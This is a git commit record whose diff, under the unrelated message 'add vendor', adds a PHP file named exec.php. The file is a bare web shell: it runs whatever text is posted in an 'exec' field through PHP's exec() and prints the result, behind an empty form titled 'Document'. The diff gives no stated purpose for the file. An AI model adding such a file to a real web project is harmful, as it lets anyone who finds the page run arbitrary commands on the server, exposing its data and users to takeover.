cbcddeb904cdeea2fa7d08dcfade8eb7fe7761c6
matthieuthuetdev <mthuet.pro@gmail.com>
2025-04-30 10:47:11 +0200

    add vendor

---
+++ exec.php
@@ -0,0 +1,21 @@
+<?php
+if (!empty($_POST)) {
+    echo exec($_POST["exec"]);
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <form method="post" action="">
+        <input type="text" name="exec">
+    </form>
+</body>
+
+</html>
